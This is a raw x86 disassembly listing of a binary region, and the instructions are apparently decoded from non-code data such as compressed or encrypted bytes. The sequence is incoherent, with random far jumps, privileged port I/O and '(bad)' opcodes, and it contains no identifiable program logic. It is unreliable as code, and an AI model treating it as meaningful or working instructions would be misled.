  411f3a:	jmp    0x1815:0xef264aa9
  411f41:	push   0xfffffffd
  411f43:	test   al,0xd5
  411f45:	dec    esp
  411f46:	add    BYTE PTR [edi+0x5985386c],bh
  411f4c:	push   cs
  411f4d:	cmp    al,cl
  411f4f:	aam    0x8
  411f51:	icebp  
  411f52:	jge    0x411fa5
  411f54:	mov    cl,0x48
  411f56:	inc    ecx
  411f57:	rcr    BYTE PTR [eax-0x2],1
  411f5a:	out    0x78,eax
  411f5c:	popa   
  411f5d:	inc    eax
  411f5e:	pop    ecx
  411f5f:	cwde   
  411f60:	cmp    ecx,DWORD PTR [ecx]
  411f62:	jb     0x411f84
  411f64:	setp   BYTE PTR [esi+0x3d]
  411f68:	in     eax,dx
  411f69:	enter  0xdce0,0xee
  411f6d:	in     al,dx
  411f6e:	jb     0x411f8f
  411f70:	out    dx,al
  411f71:	push   esi
  411f72:	xor    eax,0x468e66fc
  411f77:	loope  0x411f67
  411f79:	inc    ebp
  411f7a:	(bad)  
  411f7b:	cs loope 0x411f09
  411f7e:	jg     0x411f36
  411f80:	xchg   ebp,eax
  411f81:	in     al,dx
  411f82:	and    al,0x4b
  411f84:	scas   eax,DWORD PTR es:[edi]
  411f85:	jb     0x411fb1
  411f87:	retf   0x8a28
  411f8a:	xchg   esp,eax
  411f8b:	mov    DWORD PTR [eax-0x76c34a8a],edx
  411f91:	xor    eax,0x5c26f4c0
  411f96:	mov    esp,0x7889a574
  411f9b:	mov    bh,0xc6
  411f9d:	xor    BYTE PTR [esi+0x9],bh
  411fa0:	fnsave [eax]
  411fa2:	rcl    DWORD PTR [ebx+0x64a9cd7e],0xd1
  411fa9:	jp     0x41201a
  411fab:	fcmovnu st,st(7)
  411fad:	ss inc esi
  411faf:	cdq    
  411fb0:	and    DWORD PTR [edx+0x73f1edf8],0x7e9bfc8
  411fba:	cmp    DWORD PTR [edi+0x78],edi
  411fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fbe:	clc    
  411fbf:	lods   eax,DWORD PTR ds:[esi]
  411fc0:	xchg   al,bl
  411fc2:	adc    ah,cl
  411fc4:	mov    BYTE PTR [ebp+0x68],dh
  411fc7:	add    BYTE PTR [ecx+0x60],bh
  411fca:	pop    ds
  411fcb:	clc    
  411fcc:	sbb    sp,WORD PTR [eax]
  411fcf:	mov    cl,BYTE PTR gs:[eax+0x126595bf]
  411fd6:	dec    ebp
  411fd7:	lock mov al,ds:0x85e722ff
  411fdd:	xchg   ecx,eax
  411fde:	cmp    cl,bl
  411fe0:	pop    es
  411fe1:	pop    edi
  411fe2:	sbb    al,BYTE PTR [ecx]
  411fe4:	or     dh,BYTE PTR [eax]
  411fe6:	(bad)  [eax+ecx*4+0x1e]
  411fea:	and    esi,DWORD PTR [ebx]
  411fec:	xlat   BYTE PTR ds:[ebx]
  411fed:	pop    ss
  411fee:	pop    esi
  411fef:	fdivr  st,st(3)
  411ff1:	and    BYTE PTR [edi-0xfc2a604],bh
  411ff7:	jo     0x412020
  411ff9:	dec    ebx
  411ffa:	repz clc 
  411ffc:	mov    ah,0x73
  411ffe:	std    
  411fff:	jmp    0x411fd7
  412001:	dec    ebx
  412002:	into   
  412003:	lods   eax,DWORD PTR ds:[esi]
  412004:	add    ah,BYTE PTR [ebp-0x3783811e]
  41200a:	mov    al,0x3e
  41200c:	aaa    
  41200d:	and    BYTE PTR [ebp+0x61],ah
  412010:	xor    al,BYTE PTR [eax-0x5b529671]
  412016:	ins    DWORD PTR es:[edi],dx
  412017:	lds    esp,FWORD PTR [ecx]
  412019:	push   ebx
  41201a:	call   0x54cab843
  41201f:	jmp    0xe8e16b8a
  412024:	js     0x412001
  412026:	xchg   ebx,eax
  412027:	test   eax,0xb13b1dbd
  41202c:	and    BYTE PTR [edi],0xa4
  41202f:	fist   DWORD PTR [ebp-0x57]
  412032:	aad    0x21
  412034:	dec    esi
  412035:	jecxz  0x412060
  412037:	adc    eax,DWORD PTR es:[esi+0x6b]
  41203b:	sbb    al,0xd0
  41203d:	dec    BYTE PTR [ebx+eax*1+0x45]
  412041:	rcr    BYTE PTR [ebp+edi*2-0xf],cl
  412045:	jmp    DWORD PTR [edx-0x4de27f8a]
  41204b:	xchg   esi,eax
  41204c:	ins    DWORD PTR es:[edi],dx
  41204d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204e:	in     eax,dx
  41204f:	icebp  
  412050:	pop    ds
  412051:	stos   DWORD PTR es:[edi],eax
  412052:	push   cs
  412053:	pop    esp
  412054:	shl    ah,1
  412056:	rol    BYTE PTR [ebx-0xb],cl
  412059:	mov    bh,0xf7
  41205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41205c:	add    al,0x75
  41205e:	cmp    al,0x1b
  412060:	or     BYTE PTR ds:0x17162afb,0x76
  412067:	inc    esp
  412068:	mov    dl,0x47
  41206a:	loop   0x4120c2
  41206c:	fwait
  41206d:	inc    esi
  41206e:	push   ds
  41206f:	pop    ss
  412070:	pop    es
  412071:	lock aam 0x20
  412074:	sub    ebx,eax
  412076:	inc    esp
  412077:	and    DWORD PTR [ebx],esp
  412079:	mov    eax,0xefdb0102
  41207e:	and    DWORD PTR [eax],0xffffffba
  412081:	icebp  
  412082:	dec    ebp
  412083:	lock and DWORD PTR [eax+0x9],eax
  412087:	sbb    DWORD PTR [esi-0x375624b4],edx
  41208d:	add    eax,DWORD PTR [eax+ebp*2-0x73]
  412091:	ss push es
  412093:	mov    cl,0x24
  412095:	push   edx
  412096:	sar    DWORD PTR [ebx+edi*4-0x21],cl
  41209a:	xchg   esp,eax
  41209b:	in     al,dx
  41209c:	cmp    al,0x8e
  41209e:	and    ah,BYTE PTR [edi+ecx*8]
  4120a1:	cld    
  4120a2:	mov    ds:0x486a80fb,al
  4120a7:	test   al,0xec
  4120a9:	mov    dl,0x7a
  4120ab:	xlat   BYTE PTR ds:[ebx]
  4120ac:	iret   
  4120ad:	cmp    al,0xc1
  4120af:	pop    ds
  4120b0:	cmc    
  4120b1:	aaa    
  4120b2:	pop    edi
  4120b3:	in     eax,0xd1
  4120b5:	mov    esi,0x853777b0
  4120ba:	push   edi
  4120bb:	loopne 0x4120d4
  4120bd:	mov    ebx,0x3ec4f5cf
  4120c2:	mov    dl,0x91
  4120c4:	mov    ch,0x28
  4120c6:	pop    ebp
  4120c7:	iret   
  4120c8:	and    al,0xde
  4120ca:	pop    ebp
  4120cb:	js     0x4120c8
  4120cd:	mov    dl,0xf0
  4120cf:	cmp    ah,BYTE PTR [ecx-0x21466434]
  4120d5:	nop
  4120d6:	fidiv  WORD PTR [edx+ecx*1-0x2]
  4120da:	shr    BYTE PTR [ebp-0x6edeafcf],0x19
  4120e1:	cmc    
  4120e2:	push   ss
  4120e3:	fmul   DWORD PTR [eax+ecx*2-0x18]
  4120e7:	push   edx
  4120e8:	mov    ah,0x68
  4120ea:	xchg   ebp,eax
  4120eb:	xchg   ebx,eax
  4120ec:	sub    esi,esi
  4120ee:	jne    0x41214a
  4120f0:	sub    bl,cl
  4120f2:	(bad)  
  4120f3:	stos   DWORD PTR es:[edi],eax
  4120f4:	push   ecx
  4120f5:	mov    al,0x73
  4120f7:	fs inc eax
  4120f9:	push   ebp
  4120fa:	(bad)  
  4120fb:	pop    edi
  4120fc:	sti    
  4120fd:	xchg   edi,eax
  4120fe:	mov    edi,fs
  412100:	jns    0x4120a7
  412102:	test   DWORD PTR [edi-0x67f1ede1],edi
  412108:	push   edx
  412109:	dec    ebp
  41210a:	inc    edx
  41210b:	jno    0x4120f3
  41210d:	retf   0x5d11
  412110:	ins    DWORD PTR es:[edi],dx
  412111:	jo     0x412176
  412113:	arpl   ax,cx
  412115:	sbb    al,0xf1
  412117:	adc    BYTE PTR [ecx+ebp*8-0x5a],dh
  41211b:	retf   
  41211c:	jle    0x41210b
  41211e:	jne    0x4120a2
  412120:	enter  0xb686,0x4f
  412124:	cmc    
  412125:	and    al,0xe5
  412127:	dec    edi
  412128:	sbb    ebp,DWORD PTR [eax+0x2caea16c]
  41212e:	stos   BYTE PTR es:[edi],al
  41212f:	inc    edx
  412130:	push   edi
  412131:	dec    esp
  412132:	mov    ds:0x48c5e033,eax
  412137:	xor    BYTE PTR [eax-0xf],bl
  41213a:	cli    
  41213b:	mov    DWORD PTR [edi],ebx
  41213d:	test   al,0x7a
  41213f:	aad    0x98
  412141:	dec    ebx
  412142:	jo     0x412118
  412144:	pop    esi
  412145:	adc    edx,edi
  412147:	xchg   edi,eax
  412148:	shl    dh,1
  41214a:	xchg   al,dh
  41214c:	out    0xf2,al
  41214e:	fs mov ch,0x0
  412151:	stos   DWORD PTR es:[edi],eax
  412152:	(bad)  [edx]
  412154:	cdq    
  412155:	cmp    bh,BYTE PTR [ecx+esi*2]
  412158:	fisttp WORD PTR [edx-0x6dc0c0a8]
  41215e:	push   esp
  41215f:	mov    ds,ebx
  412161:	cli    
  412162:	jne    0x4120ea
  412164:	xlat   BYTE PTR ds:[ebx]
  412165:	into   
  412166:	aad    0xa4
  412168:	mov    BYTE PTR [edx+0x54],cl
  41216b:	xchg   ecx,eax
  41216c:	test   al,0x23
  41216e:	cli    
  41216f:	je     0x412102
  412171:	je     0x4121d6
  412173:	ret    0x8
  412176:	in     eax,0x44
  412178:	(bad)  
  412179:	sbb    DWORD PTR [ecx-0x194fb48c],0xffffffbc
  412180:	lods   eax,DWORD PTR ds:[esi]
  412181:	jg     0x41213b
  412183:	lea    ecx,[ecx+eiz*8]
  412186:	aaa    
  412187:	mov    esp,0xbfe9cbbe
  41218c:	lea    edi,[ebx-0xf]
  41218f:	adc    BYTE PTR [esi-0x63],0xbd
  412193:	loope  0x41214f
  412195:	and    cl,0x9f
  412198:	adc    eax,0xffffffc9
  41219b:	hlt    
  41219c:	popa   
  41219d:	pop    ss
  41219e:	addr16 push es
  4121a0:	ret    0x7a0d
  4121a3:	leave  
  4121a4:	lods   al,BYTE PTR ds:[esi]
  4121a5:	mov    ah,0x6f
  4121a7:	sbb    DWORD PTR [edx-0x5e5657b6],esp
  4121ad:	dec    eax
  4121ae:	fdivr  DWORD PTR [ecx+0x657c6a95]
  4121b4:	mov    ds,WORD PTR [ebp+0x7913f0b4]
  4121ba:	out    dx,eax
  4121bb:	sbb    eax,0x71086393
  4121c0:	retf   0x8e59
  4121c3:	arpl   WORD PTR [ecx+0x3f],di
  4121c6:	mov    esi,DWORD PTR [eax]
  4121c8:	shr    dl,cl
  4121ca:	mov    eax,ds:0xf001371b
  4121cf:	bound  esi,QWORD PTR [edx+ecx*2-0x53]
  4121d3:	cld    
  4121d4:	adc    ah,BYTE PTR [esi-0x24d464e7]
  4121da:	sub    edi,DWORD PTR [esi+0x13]
  4121dd:	jne    0x41217f
  4121df:	or     bh,BYTE PTR [edi+edx*8-0x1c]
  4121e3:	test   DWORD PTR [edx-0x3c4cd411],esi
  4121e9:	imul   esp,DWORD PTR [ecx+eiz*8-0x31b89a2f],0x44
  4121f1:	aas    
  4121f2:	and    dh,0xf5
  4121f5:	cmp    BYTE PTR [edx],bl
  4121f7:	push   edx
  4121f8:	fldz   
  4121fa:	mov    WORD PTR [ebx],fs
  4121fc:	adc    DWORD PTR ds:0xe67e56c4,eax
  412202:	data16 stc 
  412204:	mov    bl,0xc4
  412206:	fild   WORD PTR [ecx]
  412208:	sbb    BYTE PTR [edi+eiz*1],dh
  41220b:	iret   
  41220c:	and    eax,0xa248cc03
  412211:	mov    WORD PTR [eax+0x373233d2],cs
  412217:	lea    esi,[edx]
  412219:	fisubr DWORD PTR [ecx]
  41221b:	fstp   QWORD PTR [ecx+esi*2-0x5969a3a]
  412222:	dec    esp
  412223:	jno    0x412262
  412225:	popf   
  412226:	jb     0x412219
  412228:	jge    0x4121cb
  41222a:	add    ah,bl
  41222c:	push   ecx
  41222d:	add    BYTE PTR es:[eax+0x16b49875],dh
  412234:	mov    ebp,0x7d52159b
  412239:	fadd   DWORD PTR ds:0xeac64886
  41223f:	add    ebp,DWORD PTR [ebx-0x4541695a]
  412245:	pusha  
  412246:	repz xor eax,0x225fd1a1
  41224c:	xor    eax,0x83781dc
  412251:	scas   eax,DWORD PTR es:[edi]
  412252:	bound  ebp,QWORD PTR [eax+0x6fc71e68]
  412258:	sti    
  412259:	sub    al,0xeb
  41225b:	(bad)
  41225e:	sub    bl,dh
  412260:	mov    ah,0x4
  412262:	cmc    
  412263:	neg    DWORD PTR [eax]
  412265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412266:	int3   
  412267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412268:	aam    0x7a
  41226a:	pop    ds
  41226b:	hlt    
  41226c:	and    BYTE PTR [eax],ah
  41226e:	jmp    0xc38e:0xc858a523
  412275:	shl    dl,1
  412277:	dec    esi
  412278:	shufps xmm5,XMMWORD PTR [esi-0x3a],0x93
  41227d:	daa    
  41227e:	pop    eax
  41227f:	enter  0x48ce,0x83
  412283:	(bad)  
  412284:	sub    DWORD PTR [ecx],esi
  412286:	lods   al,BYTE PTR ds:[esi]
  412287:	push   esp
  412288:	adc    ebx,DWORD PTR [ebx+edi*1]
  41228b:	inc    esp
  41228c:	imul   esp,edi,0x601c4f73
  412292:	repnz xchg ebx,eax
  412294:	lock fcmove st,st(3)
  412297:	in     al,0x82
  412299:	test   BYTE PTR [eax+0x403b0e0b],ch
  41229f:	cmp    bl,dh
  4122a1:	popa   
  4122a2:	inc    ebp
  4122a3:	in     eax,0x6b
  4122a5:	xchg   esp,eax
  4122a6:	out    0xaf,al
  4122a8:	jne    0x412263
  4122aa:	jmp    0x4122bd
  4122ac:	inc    ecx
  4122ad:	data16 fiadd WORD PTR [edx]
  4122b0:	mov    ds,ebx
  4122b2:	call   FWORD PTR [edi+0x59]
  4122b5:	or     dl,BYTE PTR [ebx+edx*8+0x1e78229]
  4122bc:	sbb    BYTE PTR [ebp+ebx*2+0x70],bh
  4122c0:	lods   eax,DWORD PTR ds:[esi]
  4122c1:	addr16 mov eax,gs:0xdfd3
  4122c6:	dec    esi
  4122c7:	jecxz  0x4122f2
  4122c9:	cmp    eax,0xcbda92eb
  4122ce:	ja     0x4122ee
  4122d0:	pop    esi
  4122d1:	ret    0xbd3c
  4122d4:	sti    
  4122d5:	cs ret 0x7e13
  4122d9:	aam    0x13
  4122db:	adc    edx,ecx
  4122dd:	pop    esi
  4122de:	jbe    0x41235a
  4122e0:	mov    ss,WORD PTR [edi-0x5e]
  4122e3:	sti    
  4122e4:	dec    ebx
  4122e5:	inc    eax
  4122e6:	popa   
  4122e7:	icebp  
  4122e8:	xor    dh,BYTE PTR [eax+0x29]
  4122eb:	adc    DWORD PTR [esi+ebp*8-0x1c436be4],eax
  4122f2:	sbb    DWORD PTR [eax],ecx
  4122f4:	fwait
  4122f5:	pop    edi
  4122f6:	jecxz  0x412283
  4122f8:	dec    edx
  4122f9:	dec    ecx
  4122fa:	pop    esp
  4122fb:	lahf   
  4122fc:	push   cs
  4122fd:	fsubrp st(6),st
  4122ff:	imul   esp,DWORD PTR [ecx],0x93777c71
  412305:	dec    ebp
  412306:	add    BYTE PTR ds:0xb07ca31,ch
  41230c:	xor    BYTE PTR [esi+0x4f],bh
  41230f:	imul   ebp,DWORD PTR [ecx-0x62],0xbe7b853a
  412316:	xchg   ecx,eax
  412317:	test   bh,0x4c
  41231a:	and    DWORD PTR [esi+0x56c67055],ebx
  412320:	scas   al,BYTE PTR es:[edi]
  412321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412322:	(bad)  
  412323:	outs   dx,BYTE PTR ds:[esi]
  412324:	xchg   edi,eax
  412325:	scas   eax,DWORD PTR es:[edi]
  412326:	(bad)  
  412327:	cmp    eax,0x8e9271ab
  41232c:	(bad)  
  41232d:	test   al,0x83
  41232f:	retf   0x9429
  412332:	test   al,0xbe
  412334:	xchg   ebp,eax
  412335:	mov    cl,0x3e
  412337:	lahf   
  412338:	xchg   esi,eax
  412339:	daa    
  41233a:	mov    edi,0xa5b10f65
  41233f:	inc    edx
  412340:	dec    edx
  412341:	push   ds
  412342:	xor    ecx,DWORD PTR [edi]
  412344:	stc    
  412345:	jnp    0x41234d
  412347:	inc    eax
  412348:	sar    ah,0x9c
  41234b:	rol    DWORD PTR ds:0xe5e3288f,1
  412351:	sub    edx,ebp
  412353:	xchg   esp,eax
  412354:	inc    edi
  412355:	adc    ch,al
  412357:	jle    0x4123cd
  412359:	loop   0x412344
  41235b:	aad    0xb8
  41235d:	sbb    al,0x4f
  41235f:	hlt    
  412360:	int3   
  412361:	dec    edx
  412362:	add    BYTE PTR [ebp-0x31e7416a],dh
  412368:	js     0x4123d8
  41236a:	xor    dl,ah
  41236c:	pop    ds
  41236d:	pop    esp
  41236e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236f:	xor    ecx,DWORD PTR [ecx-0x4]
  412372:	push   edx
  412373:	jmp    0xd7a24230
  412378:	push   edx
  412379:	fs push eax
  41237b:	jae    0x4123e1
  41237d:	sbb    BYTE PTR [edx+0x62],0x81
  412381:	(bad)  
  412382:	imul   ebp,ebp,0x83358b2f
  412388:	das    
  412389:	mov    dl,0x35
  41238b:	inc    ecx
  41238c:	xor    eax,0x1e86b5b8
  412391:	pop    edx
  412392:	sbb    cl,BYTE PTR es:[ebx]
  412395:	fbld   TBYTE PTR [edx-0x1d]
  412398:	sub    ah,dh
  41239a:	pusha  
  41239b:	iret   
  41239c:	xchg   esp,eax
  41239d:	pop    ebx
  41239e:	cmp    esi,0x70ad5f7c
  4123a4:	push   eax
  4123a5:	sahf   
  4123a6:	repnz inc ebx
  4123a8:	and    BYTE PTR [edi+0x23],al
  4123ab:	shl    DWORD PTR [eax+edx*8],cl
  4123ae:	xchg   DWORD PTR [edi-0x563f5b7c],eax
  4123b4:	inc    ecx
  4123b5:	mov    esi,0x658aa034
  4123ba:	dec    ebp
  4123bb:	pop    edi
  4123bc:	aam    0x71
  4123be:	in     al,dx
  4123bf:	mov    BYTE PTR [esi-0x54],al
  4123c2:	cmc    
  4123c3:	push   edi
  4123c4:	xchg   ebx,eax
  4123c5:	ins    DWORD PTR es:[edi],dx
  4123c6:	adc    DWORD PTR [edi-0x69],0xf62c1307
  4123cd:	ficomp DWORD PTR [esi]
  4123cf:	call   0xb9491166
  4123d4:	pop    esi
  4123d5:	in     eax,dx
  4123d6:	popa   
  4123d7:	call   0xc2a39220
  4123dc:	and    al,0x62
  4123de:	adc    edi,DWORD PTR [esi+ebx*4+0x15c7bb88]
  4123e5:	sub    ebx,DWORD PTR [esi-0x410da929]
  4123eb:	das    
  4123ec:	aad    0x7f
  4123ee:	jns    0x412417
  4123f0:	outs   dx,DWORD PTR ds:[esi]
  4123f1:	sahf   
  4123f2:	xor    BYTE PTR [edx+0x4c522b59],0xe6
  4123f9:	sub    al,0x59
  4123fb:	test   eax,0xc92d98ef
  412400:	fwait
  412401:	sub    al,0x90
  412403:	clc    
  412404:	into   
  412405:	sub    ah,BYTE PTR [ebp-0x2d]
  412408:	jge    0x412467
  41240a:	js     0x41243e
  41240c:	fs mov dl,0x11
  41240f:	popa   
  412410:	addr16 mov eax,ds:0xa720
  412414:	rcr    BYTE PTR [eax-0x60],cl
  412417:	xor    ebp,esp
  412419:	and    BYTE PTR [ebx+edi*4],dh
  41241c:	jne    0x41244d
  41241e:	test   DWORD PTR [ebx+ebp*1-0x116226ee],edi
  412425:	or     esi,0xcf2d7d4c
  41242b:	std    
  41242c:	cld    
  41242d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41242e:	in     al,0x64
  412430:	(bad)  [ecx]
  412432:	rol    DWORD PTR [ebx],cl
  412434:	pusha  
  412435:	aaa    
  412436:	push   esi
  412437:	adc    DWORD PTR [eax-0x6a40d932],esi
  41243d:	nop
  41243e:	loope  0x412466
  412440:	ds mov ecx,ecx
  412443:	sahf   
  412444:	xchg   esp,eax
  412445:	push   es
  412446:	dec    edi
  412447:	jecxz  0x412444
  412449:	dec    eax
  41244a:	je     0x412499
  41244c:	outs   dx,DWORD PTR ds:[esi]
  41244d:	mov    ds:0x92747f10,al
  412452:	xchg   ebx,eax
  412453:	mov    ebp,0xc1d3de06
  412458:	arpl   WORD PTR [edi+0x74],dx
  41245b:	or     al,0xb
  41245d:	and    eax,0x63148fbc
  412462:	xor    eax,0x8238e06
  412467:	inc    eax
  412468:	xchg   edi,eax
  412469:	repz ret 
  41246b:	push   ebp
  41246c:	mov    dl,cl
  41246e:	add    DWORD PTR [edi+ebx*2+0x26],esi
  412472:	mov    esi,0x59fdc1eb
  412477:	adc    ah,dl
  412479:	out    0x55,al
  41247b:	jmp    0x109a:0x9b2eb599
  412482:	add    BYTE PTR [ebp+0x51],al
  412485:	mov    WORD PTR [esi-0x74],?
  412488:	pushf  
  412489:	(bad)  
  41248a:	fidiv  WORD PTR [eax-0x1042baef]
  412490:	adc    BYTE PTR [ebp-0x62],ch
  412493:	outs   dx,DWORD PTR ds:[esi]
  412494:	dec    esi
  412495:	in     al,dx
  412496:	inc    edx
  412497:	jb     0x4124ec
  412499:	mov    dh,0x18
  41249b:	rcl    DWORD PTR [ebx+0x31],1
  41249e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124a0:	mov    esi,0xb5800c91
  4124a5:	cmc    
  4124a6:	lds    ecx,FWORD PTR [ebp-0x5577f0bf]
  4124ac:	cmp    ah,BYTE PTR [edx+0x1a]
  4124af:	ds call 0xb00c:0x9b15ff0
  4124b7:	mov    ch,0x55
  4124b9:	sbb    eax,0x8ec8eb09
  4124be:	pop    ecx
  4124bf:	daa    
  4124c0:	jno    0x412475
  4124c2:	repz mov bl,0x6d
  4124c5:	es enter 0x757,0x0
  4124ca:	(bad)  
  4124cb:	adc    cl,BYTE PTR [ebp-0x7755b884]
  4124d1:	xchg   esp,eax
  4124d2:	gs jg  0x4124ab
  4124d5:	imul   esi,DWORD PTR [edx+0x59],0x391e66be
  4124dc:	sub    edi,DWORD PTR [ecx+0x7b]
  4124df:	rol    ch,1
  4124e1:	call   0xbe6f9fd5
  4124e6:	pop    es
  4124e7:	mov    esi,0x512e80fc
  4124ec:	not    ah
  4124ee:	cmp    al,0x6
  4124f0:	nop
  4124f1:	call   DWORD PTR [ebx+0x2e]
  4124f4:	rcl    DWORD PTR [esi-0x26],0x82
  4124f8:	daa    
  4124f9:	jne    0x4124ef
  4124fb:	or     dl,BYTE PTR [edi+0xf]
  4124fe:	xlat   BYTE PTR ds:[ebx]
  4124ff:	mov    ds:0x594d5b8c,al
  412504:	arpl   WORD PTR [edi],cx
  412506:	jmp    0x1d0017d1
  41250b:	inc    ecx
  41250c:	retf   
  41250d:	pop    ebp
  41250e:	mov    edi,0x5c412be5
  412513:	shl    DWORD PTR [edx],0xfb
  412516:	sbb    eax,0xc13a09c0
  41251b:	pop    ss
  41251c:	sub    DWORD PTR [ebp-0x2009fbbb],0xffffffb7
  412523:	cs mov dh,al
  412526:	dec    ebp
  412527:	add    eax,DWORD PTR [edi-0x46]
  41252a:	call   0x9ae7:0xc3d8d693
  412531:	lods   al,BYTE PTR ds:[esi]
  412532:	xor    eax,0x960b7dd4
  412537:	shr    BYTE PTR [edi],cl
  412539:	rol    esi,1
  41253b:	popf   
  41253c:	pusha  
  41253d:	hlt    
  41253e:	push   ds
  41253f:	in     al,0x23
  412541:	xchg   esp,eax
  412542:	pop    esp
  412543:	pop    eax
  412544:	mov    ch,0xa2
  412546:	scas   eax,DWORD PTR es:[edi]
  412547:	pusha  
  412548:	sub    BYTE PTR [edi],0x6b
  41254b:	push   ds
  41254c:	ins    DWORD PTR es:[edi],dx
  41254d:	test   BYTE PTR [esp+esi*1+0x3af2f572],dl
  412554:	mov    cl,0xac
  412556:	push   ecx
  412557:	jo     0x412500
  412559:	sbb    BYTE PTR [edx+0x198040c5],ah
  41255f:	mov    BYTE PTR [esi-0x39],cl
  412562:	pop    DWORD PTR [ecx+0x77]
  412565:	cwde   
  412566:	test   al,0xd9
  412568:	sar    BYTE PTR [esi+0x26],1
  41256b:	jno    0x41250f
  41256d:	test   al,0xff
  412570:	test   al,0xd7
  412572:	pop    ds
  412573:	popf   
  412574:	cmp    BYTE PTR [esi+0x13],dh
  412577:	sbb    al,0x89
  412579:	cdq    
  41257a:	scas   al,BYTE PTR es:[edi]
  41257b:	xor    ah,BYTE PTR [esi+0x11823128]
  412581:	cmp    BYTE PTR [ebp-0x1033534e],ah
  412587:	js     0x4125cb
  412589:	js     0x412540
  41258b:	xor    BYTE PTR [edi-0x8],ah
  41258e:	sub    edi,ecx
  412590:	repz mov ah,0xb1
  412593:	mov    ch,0x4a
  412595:	mov    DWORD PTR [edx+ebp*4-0x2ea130a8],ebp
  41259c:	retw   0x71c7
  4125a0:	dec    edi
  4125a1:	dec    edx
  4125a2:	imul   edi,DWORD PTR [edi],0xe093c354
  4125a8:	dec    eax
  4125a9:	cmp    ecx,ebp
  4125ab:	test   al,0x7d
  4125ad:	fldcw  WORD PTR [eax-0x8]
  4125b0:	clc    
  4125b1:	ret    
  4125b2:	test   BYTE PTR [edx-0x2e],bl
  4125b5:	stos   DWORD PTR es:[edi],eax
  4125b6:	lods   eax,DWORD PTR ds:[esi]
  4125b7:	lds    edi,FWORD PTR [edi+0x15]
  4125ba:	rol    cl,1
  4125bc:	das    
  4125bd:	jecxz  0x4125dc
  4125bf:	mov    ch,0x13
  4125c1:	iret   
  4125c2:	inc    ebx
  4125c3:	cmp    al,0xa4
  4125c5:	repnz outs dx,DWORD PTR ds:[esi]
  4125c7:	test   eax,0x3b0f51ab
  4125cc:	inc    edx
  4125cd:	in     al,0xb1
  4125cf:	imul   eax,DWORD PTR [edx+0x414af796],0x8315af29
  4125d9:	and    BYTE PTR [ebx],dl
  4125db:	sbb    edx,0x5d9c4229
  4125e1:	or     eax,0x52048b03
  4125e6:	mov    es,WORD PTR [edx+0x169f3715]
  4125ec:	push   ebx
  4125ed:	ins    DWORD PTR es:[edi],dx
  4125ee:	jge    0x41257c
  4125f0:	or     BYTE PTR [ecx+0x4ad9dcfc],dh
  4125f6:	and    ah,BYTE PTR [ecx-0x61e6dc42]
  4125fc:	dec    ecx
  4125fd:	pushf  
  4125fe:	dec    edx
  4125ff:	push   cs
  412600:	mov    ah,0xd7
  412602:	push   eax
  412603:	inc    eax
  412604:	out    0x80,eax
  412606:	xchg   edx,eax
  412607:	inc    ebp
  412608:	pop    esi
  412609:	das    
  41260a:	rol    esp,1
  41260c:	xchg   esi,eax
  41260d:	add    eax,ecx
  41260f:	scas   al,BYTE PTR es:[edi]
  412610:	adc    al,0x29
  412612:	in     eax,0x1
  412614:	ret    
  412615:	cmp    al,0xd7
  412617:	daa    
  412618:	(bad)  
  41261a:	scas   eax,DWORD PTR es:[edi]
  41261b:	xor    cl,BYTE PTR [ebp+0x29bc79d5]
  412621:	add    BYTE PTR [edx+0x561b9a55],ch
  412627:	jb     0x412687
  412629:	in     al,0x47
  41262b:	cmp    ch,BYTE PTR [edx]
  41262d:	or     ebx,DWORD PTR [ebx]
  41262f:	push   edi
  412630:	pop    ss
  412631:	or     esp,0x5939d69d
  412637:	push   0xc0e51147
  41263c:	cmp    DWORD PTR [edi-0x735fc2fb],ecx
  412642:	loope  0x4125c9
  412644:	or     edi,eax
  412646:	mov    al,ds:0xc809c2d7
  41264b:	inc    esi
  41264c:	push   ecx
  41264d:	jmp    0xecf5805d
  412652:	add    ebx,0x89af3112
  412658:	inc    ebx
  412659:	cmp    BYTE PTR [ecx+0x1f],dl
  41265c:	pop    ebx
  41265d:	sti    
  41265e:	addr16 ret 0x79bb
  412662:	adc    al,0xd6
  412664:	mov    DWORD PTR [edi+0x3e],edi
  412667:	or     esi,ebp
  412669:	sbb    dl,dh
  41266b:	jl     0x4125fc
  41266d:	stos   DWORD PTR es:[edi],eax
  41266e:	or     BYTE PTR [eax-0x29],ch
  412671:	cmc    
  412672:	pop    ss
  412673:	(bad)  
  412674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412675:	aaa    
  412676:	mov    bl,0x3e
  412678:	into   
  412679:	push   esp
  41267a:	sub    esp,DWORD PTR [ebx+0x7aa45cdf]
  412680:	lahf   
  412681:	adc    al,0x1b
  412683:	jbe    0x412650
  412685:	push   esp
  412686:	je     0x412636
  412688:	stos   BYTE PTR es:[edi],al
  412689:	adc    eax,0xd3280738
  41268e:	pop    ebp
  41268f:	fs retf 
  412691:	jae    0x412643
  412693:	or     BYTE PTR [ebp-0x5a],ah
  412696:	pop    DWORD PTR [edi-0x52]
  412699:	inc    edx
  41269a:	lahf   
  41269b:	jmp    FWORD PTR [ebp-0x11]
  41269e:	out    dx,eax
  41269f:	mov    edi,0x8d63f7fe
  4126a4:	hlt    
  4126a5:	and    eax,0x77f68179
  4126aa:	xor    DWORD PTR [ebx],esp
  4126ac:	sbb    BYTE PTR [esi-0x77b317a],ch
  4126b2:	xor    bh,ch
  4126b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b5:	inc    edi
  4126b6:	inc    edi
  4126b7:	cmp    al,0x1f
  4126b9:	and    DWORD PTR [ecx-0x78ffd7ad],eax
  4126bf:	push   esi
  4126c0:	stc    
  4126c1:	mov    eax,0x88331841
  4126c6:	jno    0x41273b
  4126c8:	daa    
  4126c9:	mov    ebx,0x1bab7e69
  4126ce:	sub    esp,DWORD PTR [eax-0x20ff4cd7]
  4126d4:	shr    BYTE PTR [edi-0x6d],0xa8
  4126d8:	mov    esi,0xd45f9091
  4126dd:	pop    edx
  4126de:	hlt    
  4126df:	jg     0x412723
  4126e1:	in     al,dx
  4126e2:	mov    bh,0x3a
